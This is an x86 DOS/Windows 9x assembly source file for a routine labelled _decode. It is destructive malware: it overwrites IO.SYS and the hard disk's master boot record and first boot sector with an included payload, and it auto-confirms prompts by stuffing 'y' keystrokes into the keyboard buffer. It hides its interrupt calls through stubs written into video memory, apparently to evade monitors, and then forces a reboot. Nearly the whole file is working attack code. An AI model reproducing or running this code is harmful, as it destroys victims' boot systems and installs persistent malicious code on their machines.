
;DEBUG                   equ     1


;         ³   debug on        debug off
; ÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; target  ³   c:\--.sys       c:\io.sys
;         ³   sect. 50        mbr       (chs=0:0:1)
;         ³   sect. 51        1st boot  (chs=0:1:1)
;
;

;ID_PORT                 equ     81h
;ID_KEY                  equ     88h

RESET_PORT              equ     0CFEh   ; PCI chipset only
RESET_KEY               equ     0

YES_KEY                 equ     1579h   ; "y"

;COUNT_PORT              equ     84h
;MAX_COUNT               equ     10

                        .386

_TEXT                   segment byte public '' use16
                        assume  cs:_TEXT, ds:_TEXT, es:_TEXT, ss:_TEXT

public                  _decode

_decode:

                        nop     ; <- s-ice bug, maybe becoz offs=0

                IFDEF   DEBUG
                        int 3
                ELSE
                        nop
                ENDIF

                        pusha
                        push    ds
                        push    es

                        mov     bx, 0b800h
                        mov     es, bx
                        mov     dword ptr es:[7F10h], 90CF21CDh
                        mov     dword ptr es:[7F20h], 90CF16CDh
                        mov     dword ptr es:[7F30h], 90CF13CDh

                        call    entry
entry:                  pop     bp
                        sub     bp, offset entry

                    ;   in      al, ID_PORT
                    ;   cmp     al, ID_KEY
                    ;   je      __0

                        push    cs
                        pop     ds
                        lea     dx, iosys[bp]

                        mov     ax, 4301h
                        xor     cx, cx
                        call    call_21

                        mov     ax, 3d02h
                        lea     dx, iosys[bp]
                        call    call_21

                        xchg    bx, ax

                        mov     ah, 3fh
                        lea     dx, mz[bp]
                        mov     cx, 2
                        call    call_21

                        mov     ax, 4200h       ; IO.SYS - DOS
                        cwd                     ; startup code at 0
                        xor     cx, cx
                        call    call_21

                        cmp     cs:mz[bp], 'ZM'
                        jne     __1

                        mov     ax, 4200h       ; IO.SYS - maybe Win95
                        mov     dx, 800h        ; startup code at 800h
                        xor     cx, cx
                        call    call_21

__1:                    mov     ah, 40h
                        lea     dx, fuckup[bp]
                        mov     cx, fuckup_size
                        call    call_21

                        mov     ah, 3eh
                        call    call_21

                        mov     ax, 4301h
                        mov     cx, 1+2+4+32
                        lea     dx, iosys[bp]
                        call    call_21


                        mov     ax, 1600h       ; Windows installed?
                        int     2fh
                        or      al, al
                        jnz     __pci_reboot    ; windows

__dos:                  mov     ah, 05h         ; dos
                        mov     cx, YES_KEY
                        call    call_16

                        push    cs
                        pop     es
                        lea     bx, fuckup[bp]

                        mov     ax, 0300h + (fuckup_size+511)/512
                IFDEF   DEBUG
                        mov     cx, 50
                        mov     dx, 0080h
                ELSE
                        mov     cx, 0001h
                        mov     dx, 0080h
                ENDIF
                        call    call_13

                        mov     ah, 05h
                        mov     cx, YES_KEY
                        call    call_16

                        mov     ax, 0300h + (fuckup_size+511)/512
                IFDEF   DEBUG
                        mov     cx, 51
                        mov     dx, 0080h
                ELSE
                        mov     cx, 0001h
                        mov     dx, 0180h
                ENDIF
                        call    call_13

__l:                    mov     ah, 01h
                        call    call_16
                        cmp     ax, YES_KEY
                        jne     __k
                        mov     ah, 00h
                        call    call_16
                        jmp     __l

__k:                ;   mov     al, ID_KEY
                    ;   out     ID_PORT, al
                    ;
                    ;   mov     al, 0
                    ;   out     COUNT_PORT, al
                    ;
__skip_mbr:
__0:                    nop
                        nop

                        mov     al, 64h         ; reset
                        out     0FEh, al

                    ;   in      al, COUNT_PORT
                    ;   inc     al
                    ;   out     COUNT_PORT, al
                    ;   cmp     al, MAX_COUNT
                    ;   jb      __z

__pci_reboot:           mov     dx, RESET_PORT
                        mov     al, RESET_KEY
                        out     dx, al

__z:                    nop
                        nop



                        pop     es
                        pop     ds
                        popa

                        xor     ax, ax  ; 0=ok, 1=? 2=?

                        retf

call_21:                pushf
                        push    cs
                        call    __a
                        ret
__a:
                        db      0eah
                        dd      0B8007F10h

call_16:                pushf
                        push    cs
                        call    __b
                        ret
__b:
                        db      0eah
                        dd      0B8007F20h

call_13:                pushf
                        push    cs
                        call    __c
                        ret
__c:
                        db      0eah
                        dd      0B8007F30h

                IFDEF   DEBUG
iosys                   db      'C:\--.SYS',0
                ELSE
iosys                   db      'C:\IO.SYS',0
                ENDIF

mz                      dw      ?

include                 fuckup.inc

                    ;   rept    4096-1024
                    ;   db      0cch
                    ;   endm

_TEXT                   ends
                        end     _decode
